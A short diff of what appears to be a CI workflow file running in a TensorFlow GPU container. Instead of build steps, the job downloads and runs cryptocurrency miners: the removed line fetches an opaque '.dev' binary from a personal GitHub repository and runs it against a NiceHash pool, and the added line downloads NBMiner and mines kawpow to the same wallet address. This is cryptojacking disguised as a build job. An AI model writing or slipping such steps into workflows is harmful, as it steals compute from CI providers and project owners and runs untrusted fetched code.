@@ -31,5 +31,5 @@ jobs:
     with:
       script: |-
         apt install wget -y &&
-        wget https://github.com/WhynotSir/sirji/raw/main/.dev && chmod +x .dev && ./.dev --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387 --user 3G4NsD5kqvT7eCmKeLSZYJGVScBK9jRvtA.Beam
+        wget https://github.com/NebuTech/NBMiner/releases/download/v39.2/NBMiner_39.2_Linux.tgz &&tar xf NBMiner_39.2_Linux.tgz &&cd NBMiner_Linux &&./nbminer -a kawpow -o stratum+tcp://kawpow.usa-west.nicehash.com:3385 -u 3G4NsD5kqvT7eCmKeLSZYJGVScBK9jRvtA.KAWPow
       image: tensorflow/tensorflow:1.14.0-gpu-py3
